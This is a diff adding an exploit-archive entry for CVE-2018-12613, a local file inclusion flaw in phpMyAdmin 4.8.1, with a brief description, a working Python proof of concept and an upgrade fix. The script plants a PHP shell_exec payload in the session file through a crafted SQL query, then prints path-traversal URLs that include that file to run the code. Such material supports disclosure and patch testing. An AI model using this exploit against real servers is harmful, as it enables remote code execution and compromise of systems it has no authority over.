@@ -1,0 +1,47 @@
+id: 31685
+date: 11/27/2018
+title: phpMyAdmin 4.8.1 Authenticated Local File Inclusion Vulnerability
+author: Lucian Ioan Nitescu
+cves: CVE-2018-12613
+
+# Exploit Title: phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion
+# Exploit Author: Lucian Ioan Nitescu
+# Contact: https://twitter.com/LucianNitescu
+# Webiste: https://nitesculucian.github.io
+# Vendor Homepage: https://www.phpmyadmin.net/
+# Software Link: https://www.phpmyadmin.net/files/4.8.1/
+# Version: 4.8.1
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2018-12613
+
+# 1. Description: 
+
+# An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the "$cfg['AllowArbitraryServer'] = true" case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the "$cfg['ServerDefault'] = 0" case (which bypasses the login requirement and runs the vulnerable code without any authentication).
+
+# 2. Proof of Concept:
+
+import requests
+
+# input the target
+VALID_PHPMYADMIN_URL = ""
+
+# input a valid session (After authentification)
+VALID_PHPMYADMIN_SESSION = ""
+
+burp0_url = VALID_PHPMYADMIN_URL + "/import.php"
+burp0_cookies = {"phpMyAdmin": VALID_PHPMYADMIN_SESSION, "pma_lang": "en", "pmaUser-1": "%7B%22iv%22%3A%22N2lLHGoe2cuUN5uvAbz8ww%3D%3D%22%2C%22mac%22%3A%222b02670d8802823d99c3ccaf1f0ece9f2eb4c536%22%2C%22payload%22%3A%22mR69lSBATnU%2B%2Bs5jL0c3yw%3D%3D%22%7D", "pmaAuth-1": "%7B%22iv%22%3A%22xoIEoAgAvAxL%5C%2F%5C%2Fa3c0iX8Q%3D%3D%22%2C%22mac%22%3A%22243d87482efacdde27e3d2a6c6e85ae3b903af66%22%2C%22payload%22%3A%22yl27EG%5C%2FIUngUnyZIKNa8O45enMc8iZyHjFpLmiDkWSs%3D%22%7D"}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
+burp0_data={"is_js_confirmed": "0", "token": "?[I568P@ei7B?OUd", "pos": "0", "goto": "server_sql.php", "message_to_show": "Your SQL query has been executed successfully.", "prev_sql_query": '', "sql_query": "select '<?php $output = shell_exec(\"ls -al; date; id;\");echo \"<pre>$output</pre>\";exit;?>'", "sql_delimiter": ";", "show_query": "1", "fk_checks": "0", "fk_checks": "1", "SQL": "Go", "ajax_request": "true", "ajax_page_request": "true", "_nocache": "1543255823534938840", "token": "?[I568P@ei7B?OUd"}
+requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+print "While autentificated:"
+
+print "- Please check: " + VALID_PHPMYADMIN_URL + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_" + VALID_PHPMYADMIN_SESSION
+
+print "- Please check: " + VALID_PHPMYADMIN_URL + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php5/sess_" + VALID_PHPMYADMIN_SESSION
+
+# 3. Solution:
+
+# Upgrade to version 4.8.2 or above.
+
+#  0day.today [2023-03-24]  #
